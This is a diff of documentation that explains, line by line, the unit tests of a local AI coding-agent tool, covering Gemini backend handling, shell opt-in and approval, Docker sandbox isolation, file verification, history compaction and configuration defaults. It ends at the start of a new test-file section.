@@ -1507,58 +1507,60 @@ last test uses real Docker, and it is skipped automatically when Docker is not r
 242 |         call = got.message["tool_calls"][0]
 243 |         self.assertEqual(call["extra_content"]["google"]["thought_signature"], "SIG")
 244 |         self.assertEqual((got.prompt_tokens, got.completion_tokens), (60, 90))   # 70 hidden + 20
-245 |         sent = to_openai([{"role": "assistant", "content": "", "tool_calls": [call]}])
-246 |         self.assertEqual(sent[0]["tool_calls"][0]["extra_content"], call["extra_content"])
-247 | 
+245 |         history = [{"role": "assistant", "content": "", "tool_calls": [call]}]
+246 |         sent = to_openai(history, gemini=True)
+247 |         self.assertEqual(sent[0]["tool_calls"][0]["extra_content"], call["extra_content"])
+248 |         self.assertNotIn("extra_content", to_openai(history)[0]["tool_calls"][0])   # local: never
+249 | 
 ```
 ```python
-248 |     def test_missing_signatures_get_placeholder_only_for_gemini(self):
-249 |         history = [{"role": "assistant", "content": "", "tool_calls": [
-250 |             {"id": "c1", "function": {"name": "read_file", "arguments": {}}}]}]
-251 |         plain = to_openai(history)[0]["tool_calls"][0]
-252 |         self.assertNotIn("extra_content", plain)                  # local servers: unchanged
-253 |         filled = to_openai(history, fill_signatures=True)[0]["tool_calls"][0]
-254 |         self.assertEqual(filled["extra_content"]["google"]["thought_signature"],
-255 |                          "skip_thought_signature_validator")
-256 | 
+250 |     def test_missing_signatures_get_placeholder_only_for_gemini(self):
+251 |         history = [{"role": "assistant", "content": "", "tool_calls": [
+252 |             {"id": "c1", "function": {"name": "read_file", "arguments": {}}}]}]
+253 |         plain = to_openai(history)[0]["tool_calls"][0]
+254 |         self.assertNotIn("extra_content", plain)                  # local servers: unchanged
+255 |         filled = to_openai(history, gemini=True)[0]["tool_calls"][0]
+256 |         self.assertEqual(filled["extra_content"]["google"]["thought_signature"],
+257 |                          "skip_thought_signature_validator")
+258 | 
 ```
 ```python
-257 |     def test_gemini_backend_needs_key_and_labels(self):
-258 |         with self.assertRaisesRegex(ValueError, "GEMINI_API_KEY"):
-259 |             make_backend(replace(Config(), backend="gemini"))
-260 |         config = replace(Config(), backend="gemini", gemini_api_key="k", gemini_models=("m1",),
-261 |                          gemini_strong_models=("m2",), fallback_backend="openai", model="q")
-262 |         self.assertIsInstance(make_backend(config), FallbackBackend)
-263 |         self.assertEqual(model_label(config), "gemini:m1 > m2 > openai:q")
-264 |         self.assertEqual(model_label(Config()), "ollama:qwen3:8b")
-265 |         with self.assertRaises(ValueError):
-266 |             make_backend(replace(config, fallback_backend="nope"))
-267 | 
+259 |     def test_gemini_backend_needs_key_and_labels(self):
+260 |         with self.assertRaisesRegex(ValueError, "GEMINI_API_KEY"):
+261 |             make_backend(replace(Config(), backend="gemini"))
+262 |         config = replace(Config(), backend="gemini", gemini_api_key="k", gemini_models=("m1",),
+263 |                          gemini_strong_models=("m2",), fallback_backend="openai", model="q")
+264 |         self.assertIsInstance(make_backend(config), FallbackBackend)
+265 |         self.assertEqual(model_label(config), "gemini:m1 > m2 > openai:q")
+266 |         self.assertEqual(model_label(Config()), "ollama:qwen3:8b")
+267 |         with self.assertRaises(ValueError):
+268 |             make_backend(replace(config, fallback_backend="nope"))
+269 | 
 ```
 ```python
-268 |     def test_doctor_reports_missing_key(self):
-269 |         healthy, lines = run_doctor(replace(Config(), backend="gemini", gemini_api_key=""))
-270 |         self.assertFalse(healthy)
-271 |         self.assertTrue(any("GEMINI_API_KEY" in line for line in lines))
-272 | 
+270 |     def test_doctor_reports_missing_key(self):
+271 |         healthy, lines = run_doctor(replace(Config(), backend="gemini", gemini_api_key=""))
+272 |         self.assertFalse(healthy)
+273 |         self.assertTrue(any("GEMINI_API_KEY" in line for line in lines))
+274 | 
 ```
 ```python
-273 |     def test_doctor_treats_a_missing_backup_as_a_note(self):
-274 |         def fake_get(url, headers=None):
-275 |             if url.startswith(Config().gemini_base):
-276 |                 return {"data": [{"id": "models/m1"}, {"id": "models/m2"}]}
-277 |             raise OSError("connection refused")             # the backup server is not running
-278 |         with tempfile.TemporaryDirectory() as tmp, \
-279 |                 mock.patch("localagent.doctor._get_json", side_effect=fake_get):
-280 |             config = replace(Config(), backend="gemini", gemini_api_key="k", gemini_models=("m1",),
-281 |                              gemini_strong_models=("m2",), fallback_backend="openai",
-282 |                              usage_file=Path(tmp) / "usage.json")
-283 |             healthy, lines = run_doctor(config)
-284 |         self.assertTrue(healthy)                             # Gemini works: the backup is optional
-285 |         self.assertFalse(any(line.startswith("FAIL") for line in lines))
-286 |         self.assertTrue(any(line.startswith("note  the backup model") for line in lines))
-287 | 
-288 | 
+275 |     def test_doctor_treats_a_missing_backup_as_a_note(self):
+276 |         def fake_get(url, headers=None):
+277 |             if url.startswith(Config().gemini_base):
+278 |                 return {"data": [{"id": "models/m1"}, {"id": "models/m2"}]}
+279 |             raise OSError("connection refused")             # the backup server is not running
+280 |         with tempfile.TemporaryDirectory() as tmp, \
+281 |                 mock.patch("localagent.doctor._get_json", side_effect=fake_get):
+282 |             config = replace(Config(), backend="gemini", gemini_api_key="k", gemini_models=("m1",),
+283 |                              gemini_strong_models=("m2",), fallback_backend="openai",
+284 |                              usage_file=Path(tmp) / "usage.json")
+285 |             healthy, lines = run_doctor(config)
+286 |         self.assertTrue(healthy)                             # Gemini works: the backup is optional
+287 |         self.assertFalse(any(line.startswith("FAIL") for line in lines))
+288 |         self.assertTrue(any(line.startswith("note  the offline backup") for line in lines))
+289 | 
+290 | 
 ```
 - Against the fake server: `reasoning_effort` is sent; the tool call's `extra_content` (thought signature) is kept on
   the stored message and sent back by `to_openai`; with 60 prompt + 20 completion but 150 total tokens, 90 are counted
@@ -1572,52 +1574,52 @@ last test uses real Docker, and it is skipped automatically when Docker is not r
 
 ## Runners
 ```python
-289 | class RunnerTests(unittest.TestCase):
+291 | class RunnerTests(unittest.TestCase):
 ```
 ```python
-290 |     def test_local_runner_refuses_shell_and_toolbox_hides_tool(self):
-291 |         with tempfile.TemporaryDirectory() as tmp:
-292 |             runner = LocalRunner(Config(), Path(tmp))
-293 |             self.assertEqual(runner.run("shell", ["ls"])[0], 126)
-294 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _a: True)
-295 |             names = [spec["function"]["name"] for spec in box.specs()]
-296 |             self.assertNotIn("run_shell", names)
-297 |             box.close()
-298 | 
+292 |     def test_local_runner_refuses_shell_and_toolbox_hides_tool(self):
+293 |         with tempfile.TemporaryDirectory() as tmp:
+294 |             runner = LocalRunner(Config(), Path(tmp))
+295 |             self.assertEqual(runner.run("shell", ["ls"])[0], 126)
+296 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _a: True)
+297 |             names = [spec["function"]["name"] for spec in box.specs()]
+298 |             self.assertNotIn("run_shell", names)
+299 |             box.close()
+300 | 
 ```
 ```python
-299 |     def test_docker_toolbox_offers_shell(self):
-300 |         with tempfile.TemporaryDirectory() as tmp:
-301 |             box = ToolBox(replace(Config(), workspace=Path(tmp), sandbox="docker"), lambda _a: True)
-302 |             self.assertIn("run_shell", [s["function"]["name"] for s in box.specs()])
-303 |             self.assertIn("ERROR", box.call("run_shell", {"command": "  "}))
-304 |             box.close()                                      # never started: nothing to stop
-305 | 
+301 |     def test_docker_toolbox_offers_shell(self):
+302 |         with tempfile.TemporaryDirectory() as tmp:
+303 |             box = ToolBox(replace(Config(), workspace=Path(tmp), sandbox="docker"), lambda _a: True)
+304 |             self.assertIn("run_shell", [s["function"]["name"] for s in box.specs()])
+305 |             self.assertIn("ERROR", box.call("run_shell", {"command": "  "}))
+306 |             box.close()                                      # never started: nothing to stop
+307 | 
 ```
 ```python
-306 |     @unittest.skipUnless(docker_available(), "Docker is not running")
-307 |     def test_docker_sandbox_isolation_end_to_end(self):
-308 |         with tempfile.TemporaryDirectory() as tmp:
-309 |             config = replace(Config(), workspace=Path(tmp), sandbox="docker", command_timeout=20)
-310 |             box = ToolBox(config, lambda _a: True)
-311 |             try:
-312 |                 box.call("write_file", {"path": "hi.py", "content": "print('from container')\n"})
-313 |                 self.assertIn("from container", box.call("run_python", {"path": "hi.py"}))
-314 |                 who = box.call("run_shell", {"command": "whoami && pwd"})
-315 |                 self.assertIn("agent", who)                  # not root
-316 |                 self.assertIn("/work", who)
-317 |                 net = box.call("run_shell", {"command": "python -c \"import urllib.request as u; "
-318 |                                              "u.urlopen('http://example.com', timeout=5)\""})
-319 |                 self.assertNotIn("exit code 0", net)         # no network by default
-320 |                 slow = replace(config, command_timeout=2)
-321 |                 runner = DockerRunner(slow, Path(tmp))
-322 |                 code, _ = runner.run("shell", ["sleep 30"])
-323 |                 runner.stop()
-324 |                 self.assertEqual(code, 124)                  # timeout kills the command
-325 |             finally:
-326 |                 box.close()
-327 | 
-328 | 
+308 |     @unittest.skipUnless(docker_available(), "Docker is not running")
+309 |     def test_docker_sandbox_isolation_end_to_end(self):
+310 |         with tempfile.TemporaryDirectory() as tmp:
+311 |             config = replace(Config(), workspace=Path(tmp), sandbox="docker", command_timeout=20)
+312 |             box = ToolBox(config, lambda _a: True)
+313 |             try:
+314 |                 box.call("write_file", {"path": "hi.py", "content": "print('from container')\n"})
+315 |                 self.assertIn("from container", box.call("run_python", {"path": "hi.py"}))
+316 |                 who = box.call("run_shell", {"command": "whoami && pwd"})
+317 |                 self.assertIn("agent", who)                  # not root
+318 |                 self.assertIn("/work", who)
+319 |                 net = box.call("run_shell", {"command": "python -c \"import urllib.request as u; "
+320 |                                              "u.urlopen('http://example.com', timeout=5)\""})
+321 |                 self.assertNotIn("exit code 0", net)         # no network by default
+322 |                 slow = replace(config, command_timeout=2)
+323 |                 runner = DockerRunner(slow, Path(tmp))
+324 |                 code, _ = runner.run("shell", ["sleep 30"])
+325 |                 runner.stop()
+326 |                 self.assertEqual(code, 124)                  # timeout kills the command
+327 |             finally:
+328 |                 box.close()
+329 | 
+330 | 
 ```
 - Locally the shell is refused (code 126) and the `run_shell` tool is not even offered to the model.
 - With `sandbox="docker"` the tool is offered and an empty command is rejected — without starting a container.
@@ -1626,8 +1628,8 @@ last test uses real Docker, and it is skipped automatically when Docker is not r
   2-second limit returns the timeout code 124. The container is removed in `finally`.
 
 ```python
-329 | if __name__ == "__main__":
-330 |     unittest.main()
+331 | if __name__ == "__main__":
+332 |     unittest.main()
 ```
 - Lets you run the file directly.
 
@@ -1693,7 +1695,7 @@ No model and no network are needed (scripted fakes again); the JavaScript test r
  40 |             snap = Checkpoints(root)
  41 |             snap.take()
  42 |             (root / "node_modules/pkg/index.js").write_text("changed", encoding="utf-8")
- 43 |             self.assertIn("restored 0", snap.undo())                      # not snapshotted at all
+ 43 |             self.assertEqual(snap.undo(), "nothing to undo")              # not snapshotted at all
  44 | 
 ```
 ```python
@@ -1703,9 +1705,10 @@ No model and no network are needed (scripted fakes again); the JavaScript test r
  48 |             (Path(tmp) / "a.js").write_text("const needle = 1;\n", encoding="utf-8")
  49 |             (Path(tmp) / "b.py").write_text("needle = 2\n", encoding="utf-8")
  50 |             self.assertIn("a.js:1", box.call("search", {"pattern": "needle", "glob": "*.js"}))
- 51 |             self.assertNotIn("a.js", box.call("search", {"pattern": "needle"}))   # default *.py
- 52 | 
+ 51 |             self.assertNotIn("a.js", box.call("search", {"pattern": "needle", "glob": "*.py"}))
+ 52 |             self.assertIn("a.js:1", box.call("search", {"pattern": "needle"}))   # default: all
  53 | 
+ 54 | 
 ```
 - A project with `node_modules`, `.localagent` and `venv` folders: only `README.md` and `src/app.py` are found (sorted),
   the prompt's file list shows exactly those two, and a change inside `node_modules` is invisible to `/undo` snapshots.
@@ -1713,42 +1716,42 @@ No model and no network are needed (scripted fakes again); the JavaScript test r
 
 ## Languages
 ```python
- 54 | class LanguageTests(unittest.TestCase):
+ 55 | class LanguageTests(unittest.TestCase):
 ```
 ```python
- 55 |     def check(self, name: str, text: str) -> bool:
- 56 |         with tempfile.TemporaryDirectory() as tmp:
- 57 |             path = Path(tmp) / name
- 58 |             path.write_text(text, encoding="utf-8")
- 59 |             return verify_file(path, Path(tmp)).ok
- 60 | 
+ 56 |     def check(self, name: str, text: str) -> bool:
+ 57 |         with tempfile.TemporaryDirectory() as tmp:
+ 58 |             path = Path(tmp) / name
+ 59 |             path.write_text(text, encoding="utf-8")
+ 60 |             return verify_file(path, Path(tmp)).ok
+ 61 | 
 ```
 ```python
- 61 |     def test_json_and_toml(self):
- 62 |         self.assertTrue(self.check("a.json", '{"a": 1}'))
- 63 |         self.assertFalse(self.check("a.json", '{"a": 1,}'))
- 64 |         self.assertTrue(self.check("p.toml", 'name = "x"\n'))
- 65 |         self.assertFalse(self.check("p.toml", "name = \n"))
- 66 |         self.assertTrue(self.check("notes.md", "anything at all {"))           # unchecked type
- 67 | 
+ 62 |     def test_json_and_toml(self):
+ 63 |         self.assertTrue(self.check("a.json", '{"a": 1}'))
+ 64 |         self.assertFalse(self.check("a.json", '{"a": 1,}'))
+ 65 |         self.assertTrue(self.check("p.toml", 'name = "x"\n'))
+ 66 |         self.assertFalse(self.check("p.toml", "name = \n"))
+ 67 |         self.assertTrue(self.check("notes.md", "anything at all {"))           # unchecked type
+ 68 | 
 ```
 ```python
- 68 |     @unittest.skipUnless(shutil.which("node"), "Node.js not installed")
- 69 |     def test_javascript_with_node(self):
- 70 |         self.assertTrue(self.check("a.js", "const x = 1;\nmodule.exports = { x };\n"))
- 71 |         self.assertFalse(self.check("a.js", "const x = ;\n"))
- 72 | 
+ 69 |     @unittest.skipUnless(shutil.which("node"), "Node.js not installed")
+ 70 |     def test_javascript_with_node(self):
+ 71 |         self.assertTrue(self.check("a.js", "const x = 1;\nmodule.exports = { x };\n"))
+ 72 |         self.assertFalse(self.check("a.js", "const x = ;\n"))
+ 73 | 
 ```
 ```python
- 73 |     def test_bad_json_write_is_rolled_back_and_workspace_check_sees_it(self):
- 74 |         with tempfile.TemporaryDirectory() as tmp:
- 75 |             box = box_for(tmp)
- 76 |             self.assertIn("REJECTED", box.call("write_file", {"path": "c.json", "content": "{oops"}))
- 77 |             self.assertFalse((Path(tmp) / "c.json").exists())
- 78 |             (Path(tmp) / "d.json").write_text("[1,", encoding="utf-8")            # broken behind our back
- 79 |             self.assertEqual(len(box.check_workspace()), 1)
- 80 | 
+ 74 |     def test_bad_json_write_is_rolled_back_and_workspace_check_sees_it(self):
+ 75 |         with tempfile.TemporaryDirectory() as tmp:
+ 76 |             box = box_for(tmp)
+ 77 |             self.assertIn("REJECTED", box.call("write_file", {"path": "c.json", "content": "{oops"}))
+ 78 |             self.assertFalse((Path(tmp) / "c.json").exists())
+ 79 |             (Path(tmp) / "d.json").write_text("[1,", encoding="utf-8")            # broken behind our back
+ 80 |             self.assertEqual(len(box.check_workspace()), 1)
  81 | 
+ 82 | 
 ```
 - `check` writes a file and runs `verify_file` on it.
 - Valid JSON/TOML pass; a trailing comma in JSON and a missing TOML value fail; a Markdown file is never checked.
@@ -1758,46 +1761,46 @@ No model and no network are needed (scripted fakes again); the JavaScript test r
 
 ## Todo and shell
 ```python
- 82 | class TodoAndShellTests(unittest.TestCase):
+ 83 | class TodoAndShellTests(unittest.TestCase):
 ```
 ```python
- 83 |     def test_todo_checklist(self):
- 84 |         with tempfile.TemporaryDirectory() as tmp:
- 85 |             box = box_for(tmp)
- 86 |             out = box.call("todo", {"items": [{"text": "read", "done": True}, {"text": "write"}]})
- 87 |             self.assertEqual(out.splitlines(), ["TODO 1/2 done", "  [x] read", "  [ ] write"])
- 88 |             self.assertEqual(len(box.todo), 2)
- 89 |             self.assertIn("ERROR", box.call("todo", {"items": []}))
- 90 |             self.assertIn("[ ] plain text", box.call("todo", {"items": ["plain text"]}))
- 91 | 
+ 84 |     def test_todo_checklist(self):
+ 85 |         with tempfile.TemporaryDirectory() as tmp:
+ 86 |             box = box_for(tmp)
+ 87 |             out = box.call("todo", {"items": [{"text": "read", "done": True}, {"text": "write"}]})
+ 88 |             self.assertEqual(out.splitlines(), ["TODO 1/2 done", "  [x] read", "  [ ] write"])
+ 89 |             self.assertEqual(len(box.todo), 2)
+ 90 |             self.assertIn("ERROR", box.call("todo", {"items": []}))
+ 91 |             self.assertIn("[ ] plain text", box.call("todo", {"items": ["plain text"]}))
+ 92 | 
 ```
 ```python
- 92 |     def test_host_shell_is_opt_in_and_asks(self):
- 93 |         with tempfile.TemporaryDirectory() as tmp:
- 94 |             self.assertNotIn("run_shell", [s["function"]["name"] for s in box_for(tmp).specs()])
- 95 |             asked: list[str] = []
- 96 |             cfg = replace(Config(), workspace=Path(tmp), allow_host_shell=True)
- 97 |             box = ToolBox(cfg, approve=lambda action: asked.append(action) or True)
- 98 |             self.assertIn("run_shell", [s["function"]["name"] for s in box.specs()])
- 99 |             out = box.call("run_shell", {"command": "echo hello-shell"})
-100 |             self.assertIn("hello-shell", out)
-101 |             self.assertTrue(asked and "echo hello-shell" in asked[0])
-102 |             refused = LocalRunner(Config(), Path(tmp)).run("shell", ["echo x"])
-103 |             self.assertEqual(refused[0], 126)
-104 | 
+ 93 |     def test_host_shell_is_opt_in_and_asks(self):
+ 94 |         with tempfile.TemporaryDirectory() as tmp:
+ 95 |             self.assertNotIn("run_shell", [s["function"]["name"] for s in box_for(tmp).specs()])
+ 96 |             asked: list[str] = []
+ 97 |             cfg = replace(Config(), workspace=Path(tmp), allow_host_shell=True)
+ 98 |             box = ToolBox(cfg, approve=lambda action: asked.append(action) or True)
+ 99 |             self.assertIn("run_shell", [s["function"]["name"] for s in box.specs()])
+100 |             out = box.call("run_shell", {"command": "echo hello-shell"})
+101 |             self.assertIn("hello-shell", out)
+102 |             self.assertTrue(asked and "echo hello-shell" in asked[0])
+103 |             refused = LocalRunner(Config(), Path(tmp)).run("shell", ["echo x"])
+104 |             self.assertEqual(refused[0], 126)
+105 | 
 ```
 ```python
-105 |     def test_todo_progress_is_shown_in_full(self):
-106 |         with tempfile.TemporaryDirectory() as tmp:
-107 |             cfg = replace(Config(), workspace=Path(tmp))
-108 |             script = [tool_call("todo", items=[{"text": "step one"}, {"text": "step two"}]),
-109 |                       {"role": "assistant", "content": "ok"}]
-110 |             agent = Agent(cfg, FakeBackend(script), ToolBox(cfg, lambda _a: True), Meter())
-111 |             events: list[str] = []
-112 |             agent.run("Plan it", on_event=events.append)
-113 |             self.assertIn("     [ ] step two", events)
-114 | 
+106 |     def test_todo_progress_is_shown_in_full(self):
+107 |         with tempfile.TemporaryDirectory() as tmp:
+108 |             cfg = replace(Config(), workspace=Path(tmp))
+109 |             script = [tool_call("todo", items=[{"text": "step one"}, {"text": "step two"}]),
+110 |                       {"role": "assistant", "content": "ok"}]
+111 |             agent = Agent(cfg, FakeBackend(script), ToolBox(cfg, lambda _a: True), Meter())
+112 |             events: list[str] = []
+113 |             agent.run("Plan it", on_event=events.append)
+114 |             self.assertIn("     [ ] step two", events)
 115 | 
+116 | 
 ```
 - The checklist renders as `TODO 1/2 done` + `[x]`/`[ ]` lines; an empty list is an error; plain-text items work too
   (the real model sent plain strings the first time).
@@ -1807,72 +1810,72 @@ No model and no network are needed (scripted fakes again); the JavaScript test r
 
 ## Compaction and notes
 ```python
-116 | class CompactionTests(unittest.TestCase):
+117 | class CompactionTests(unittest.TestCase):
 ```
 ```python
-117 |     def make(self, tmp, script, **kw):
-118 |         cfg = replace(Config(), workspace=Path(tmp), **kw)
-119 |         backend = FakeBackend(script)
-120 |         return Agent(cfg, backend, ToolBox(cfg, lambda _a: True), Meter()), backend
-121 | 
+118 |     def make(self, tmp, script, **kw):
+119 |         cfg = replace(Config(), workspace=Path(tmp), **kw)
+120 |         backend = FakeBackend(script)
+121 |         return Agent(cfg, backend, ToolBox(cfg, lambda _a: True), Meter()), backend
+122 | 
 ```
 ```python
-122 |     def test_manual_compact_replaces_history_with_summary(self):
-123 |         with tempfile.TemporaryDirectory() as tmp:
-124 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "one"},
-125 |                                        {"role": "assistant", "content": "two"},
-126 |                                        {"role": "assistant", "content": "SUMMARY: user wants X"}])
-127 |             self.assertEqual(agent.compact(), "nothing to compact")
-128 |             agent.run("first question")
-129 |             agent.run("second question")
-130 |             result = agent.compact()
-131 |             self.assertIn("compacted", result)
-132 |             self.assertEqual([m["role"] for m in agent.messages], ["system", "user", "assistant"])
-133 |             self.assertIn("SUMMARY: user wants X", agent.messages[1]["content"])
-134 | 
+123 |     def test_manual_compact_replaces_history_with_summary(self):
+124 |         with tempfile.TemporaryDirectory() as tmp:
+125 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "one"},
+126 |                                        {"role": "assistant", "content": "two"},
+127 |                                        {"role": "assistant", "content": "SUMMARY: user wants X"}])
+128 |             self.assertEqual(agent.compact(), "nothing to compact")
+129 |             agent.run("first question")
+130 |             agent.run("second question")
+131 |             result = agent.compact()
+132 |             self.assertIn("compacted", result)
+133 |             self.assertEqual([m["role"] for m in agent.messages], ["system", "user", "assistant"])
+134 |             self.assertIn("SUMMARY: user wants X", agent.messages[1]["content"])
+135 | 
 ```
 ```python
-135 |     def test_empty_summary_keeps_history(self):
-136 |         with tempfile.TemporaryDirectory() as tmp:
-137 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "a"},
-138 |                                        {"role": "assistant", "content": "b"},
-139 |                                        {"role": "assistant", "content": ""}])
-140 |             agent.run("q1")
-141 |             agent.run("q2")
-142 |             before = len(agent.messages)
-143 |             self.assertIn("skipped", agent.compact())
-144 |             self.assertEqual(len(agent.messages), before)
-145 | 
+136 |     def test_empty_summary_keeps_history(self):
+137 |         with tempfile.TemporaryDirectory() as tmp:
+138 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "a"},
+139 |                                        {"role": "assistant", "content": "b"},
+140 |                                        {"role": "assistant", "content": ""}])
+141 |             agent.run("q1")
+142 |             agent.run("q2")
+143 |             before = len(agent.messages)
+144 |             self.assertIn("skipped", agent.compact())
+145 |             self.assertEqual(len(agent.messages), before)
+146 | 
 ```
 ```python
-146 |     def test_automatic_compaction_before_a_request(self):
-147 |         with tempfile.TemporaryDirectory() as tmp:
-148 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "x" * 400}] * 3
-149 |                                  + [{"role": "assistant", "content": "SUM"},
-150 |                                     {"role": "assistant", "content": "answer"}],
-151 |                                  num_ctx=1000, compact_at=0.1)
-152 |             for question in ("q1", "q2", "q3"):
-153 |                 agent.run(question)
-154 |             events: list[str] = []
-155 |             self.assertEqual(agent.run("q4", on_event=events.append), "answer")
-156 |             self.assertTrue(any("summarising" in e for e in events))
-157 |             self.assertIn("SUM", agent.messages[1]["content"])
-158 |             self.assertIn("300 words", COMPACT_PROMPT)
-159 | 
+147 |     def test_automatic_compaction_before_a_request(self):
+148 |         with tempfile.TemporaryDirectory() as tmp:
+149 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "x" * 400}] * 3
+150 |                                  + [{"role": "assistant", "content": "SUM"},
+151 |                                     {"role": "assistant", "content": "answer"}],
+152 |                                  num_ctx=3000, compact_at=0.1)   # the system prompt must fit
+153 |             for question in ("q1", "q2", "q3"):
+154 |                 agent.run(question)
+155 |             events: list[str] = []
+156 |             self.assertEqual(agent.run("q4", on_event=events.append), "answer")
+157 |             self.assertTrue(any("summarising" in e for e in events))
+158 |             self.assertIn("SUM", agent.messages[1]["content"])
+159 |             self.assertIn("300 words", COMPACT_PROMPT)
+160 | 
 ```
 ```python
-160 |     def test_reset_and_refresh_reload_agent_notes(self):
-161 |         with tempfile.TemporaryDirectory() as tmp:
-162 |             agent, _ = self.make(tmp, [])
-163 |             self.assertNotIn("USE TABS", agent.messages[0]["content"])
-164 |             (Path(tmp) / "AGENT.md").write_text("USE TABS", encoding="utf-8")
-165 |             agent.refresh_system()
-166 |             self.assertIn("USE TABS", agent.messages[0]["content"])
-167 |             agent.reset()
-168 |             self.assertEqual(len(agent.messages), 1)
-169 |             self.assertIn("USE TABS", agent.messages[0]["content"])
-170 | 
+161 |     def test_reset_and_refresh_reload_agent_notes(self):
+162 |         with tempfile.TemporaryDirectory() as tmp:
+163 |             agent, _ = self.make(tmp, [])
+164 |             self.assertNotIn("USE TABS", agent.messages[0]["content"])
+165 |             (Path(tmp) / "AGENT.md").write_text("USE TABS", encoding="utf-8")
+166 |             agent.refresh_system()
+167 |             self.assertIn("USE TABS", agent.messages[0]["content"])
+168 |             agent.reset()
+169 |             self.assertEqual(len(agent.messages), 1)
+170 |             self.assertIn("USE TABS", agent.messages[0]["content"])
 171 | 
+172 | 
 ```
 - A fresh agent has nothing to compact. After two requests, `compact()` leaves exactly system + summary + "Understood",
   with the model's summary inside.
@@ -1883,39 +1886,39 @@ No model and no network are needed (scripted fakes again); the JavaScript test r
 
 ## Any-folder defaults
 ```python
-172 | class AnyFolderTests(unittest.TestCase):
+173 | class AnyFolderTests(unittest.TestCase):
 ```
 ```python
-173 |     def test_defaults_work_in_current_folder_with_global_quota_file(self):
-174 |         self.assertEqual(Config().workspace, Path("."))
-175 |         self.assertEqual(Config().usage_file, Path.home() / ".localagent" / "usage.json")
-176 |         args = build_parser().parse_args(["--allow-shell"])
-177 |         self.assertTrue(build_config(args).allow_host_shell)
-178 |         self.assertTrue(INIT_PROMPT.startswith("Create AGENT.md"))
-179 | 
+174 |     def test_defaults_work_in_current_folder_with_global_quota_file(self):
+175 |         self.assertEqual(Config().workspace, Path("."))
+176 |         self.assertEqual(Config().usage_file, Path.home() / ".localagent" / "usage.json")
+177 |         args = build_parser().parse_args(["--allow-shell"])
+178 |         self.assertTrue(build_config(args).allow_host_shell)
+179 |         self.assertTrue(INIT_PROMPT.startswith("Create AGENT.md"))
+180 | 
 ```
 ```python
-180 |     def test_usage_file_can_be_moved_by_environment(self):
-181 |         old = os.environ.get("LOCALAGENT_USAGE_FILE")
-182 |         os.environ["LOCALAGENT_USAGE_FILE"] = "elsewhere.json"
-183 |         try:
-184 |             self.assertEqual(Config.from_env().usage_file, Path("elsewhere.json"))
-185 |         finally:
-186 |             if old is None:
-187 |                 del os.environ["LOCALAGENT_USAGE_FILE"]
-188 |             else:
-189 |                 os.environ["LOCALAGENT_USAGE_FILE"] = old
-190 |         self.assertTrue(json.dumps(str(Config().usage_file)))
-191 | 
+181 |     def test_usage_file_can_be_moved_by_environment(self):
+182 |         old = os.environ.get("LOCALAGENT_USAGE_FILE")
+183 |         os.environ["LOCALAGENT_USAGE_FILE"] = "elsewhere.json"
+184 |         try:
+185 |             self.assertEqual(Config.from_env().usage_file, Path("elsewhere.json"))
+186 |         finally:
+187 |             if old is None:
+188 |                 del os.environ["LOCALAGENT_USAGE_FILE"]
+189 |             else:
+190 |                 os.environ["LOCALAGENT_USAGE_FILE"] = old
+191 |         self.assertTrue(json.dumps(str(Config().usage_file)))
 192 | 
+193 | 
 ```
 - The workspace defaults to the current folder; the quota file lives in the home folder; `--allow-shell` reaches the
   config; `/init`'s request asks for `AGENT.md`.
 - `LOCALAGENT_USAGE_FILE` moves the quota file (the test restores the environment afterwards).
 
 ```python
-193 | if __name__ == "__main__":
-194 |     unittest.main()
+194 | if __name__ == "__main__":
+195 |     unittest.main()
 ```
 - Lets you run the file directly.
 
@@ -2834,3 +2837,1203 @@ Node, Go, Rust, gcc/g++ and PowerShell, so they all ran); everything else uses f
 ```
 - Lets you run the file directly.
 
+---
+# `tests/test_phase10.py` — version 0.6: safety, faithful edits, offline/online, the Claude-Code-style chat
+
+**Role:** proves every fix and feature of version 0.6. Each class below starts from a problem that was **reproduced
+first** (a probe script showed the old behaviour) and then fixed; the test pins the fixed behaviour so it cannot
+return. 59 tests, about 11 seconds, no model and no internet needed.
+
+## Helpers
+```python
+  1 | """Tests for version 0.6: safety fixes, faithful edits, smarter context, the online/offline
+  2 | modes, the local model server and the Claude-Code-style chat features."""
+  3 | import contextlib
+  4 | import importlib.util
+  5 | import io
+  6 | import json
+  7 | import os
+  8 | import shutil
+  9 | import socket
+ 10 | import subprocess
+ 11 | import sys
+ 12 | import tempfile
+ 13 | import time
+ 14 | import unittest
+ 15 | from dataclasses import replace
+ 16 | from datetime import datetime, timezone
+ 17 | from pathlib import Path
+ 18 | from unittest import mock
+ 19 | 
+ 20 | from localagent import cli, localserver, runners
+ 21 | from localagent.agent import BAD_ARGUMENTS, EMPTY_REPLY, EMPTY_TWICE, Agent, _wants_change
+ 22 | from localagent.backends import make_backend, make_gemini
+ 23 | from localagent.checkpoint import Checkpoints
+ 24 | from localagent.config import Config
+ 25 | from localagent.context import project_tree
+ 26 | from localagent.llm import REMOVED, SHORTENED, LLMError, fit_history, message_size
+ 27 | from localagent.localserver import LlamaServer, LocalModel
+ 28 | from localagent.meter import Meter
+ 29 | from localagent.ratelimit import RateLimiter, _pacific_offset, pacific_day, shared_limiter
+ 30 | from localagent.resilient import OFFLINE_HELP, Entry, FallbackBackend
+ 31 | from localagent.sandbox import looks_binary, project_files, quote_for_shell, run_command, skip_dir
+ 32 | from localagent.session import SessionLog, load_session, session_title
+ 33 | from localagent.settings import (Permissions, apply_env, command_parts, escape_pattern,
+ 34 |                                  load_settings, suggest_rule)
+ 35 | from localagent.tools import ToolBox
+ 36 | from localagent.verify import strip_jsonc, verify_file
+ 37 | 
+ 38 | from .test_agent import FakeBackend, tool_call
+ 39 | from .test_phase2 import FakeServer
+ 40 | from .test_phase4 import ScriptedBackend, reply
+ 41 | 
+ 42 | ROOT = Path(__file__).resolve().parent.parent
+ 43 | _SPEC = importlib.util.spec_from_file_location("check_commit", ROOT / "tools" / "check_commit.py")
+ 44 | assert _SPEC is not None and _SPEC.loader is not None
+ 45 | check_commit = importlib.util.module_from_spec(_SPEC)
+ 46 | _SPEC.loader.exec_module(check_commit)
+ 47 | FAKE_LLAMA = r'''
+ 48 | import json, sys, time
+ 49 | from http.server import BaseHTTPRequestHandler, HTTPServer
